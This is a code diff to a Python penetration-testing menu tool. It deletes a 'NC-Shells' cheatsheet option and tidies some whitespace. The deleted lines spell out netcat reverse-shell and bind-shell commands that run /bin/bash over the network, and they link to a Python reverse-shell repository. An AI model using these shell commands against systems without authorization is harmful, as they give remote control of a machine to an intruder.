@@ -147,10 +147,7 @@ class HunterToolkit:
             green + "{" + red + "15" + green + "}" + cyan +
             " Ping " + magenta + ">> " + yellow + " Check host availability."
         )
-        print(
-            green + "{" + red + "16" + green + "}" + cyan +
-            " NC-Shells " + magenta + ">> " + yellow + " Shell cheatsheet."
-        )
+
         print(green + "{" + red + "99" + green + "}" + green + " Exit\n")
 
         print(magenta + "=" * 70)
@@ -723,44 +720,15 @@ class HunterToolkit:
 
                 check.main()
 
-            elif self.menu_option_choice == 16:
-                print(
-                    """
-    Shell cheatsheet
-    -------------------------
-    
-    -> Netcat reverse shell:
-    ==========================
-    - On the remote computer:
-    $  nc <IPv4_address> <Port> -e /bin/bash
-    
-    - On your computer:
-    $ nc -lvnp <Port>
-    
-    
-    -> Netcat bind shell:
-    =========================
-    - On the remote computer:
-    $ nc -lvnp <Port> -e /bin/bash
-    
-    - On your computer:
-    $ nc <IPv4_address> <Port>
-    
-    
-    -> Python3 reverse shell
-    =========================
-    https://github.com/Keyj33k/ReverseShell
-    
-                """)
-                input("Press any key to continue")
-
-
             elif self.menu_option_choice == 99:
                 sys.exit(0)
+                
             else:
                 print("Invalid Input!")
+                
         except KeyboardInterrupt:
             print("You pressed Ctrl+C. EXIT!")
+        
         except Exception:
             raise ValueError("Invalid Input!")
 
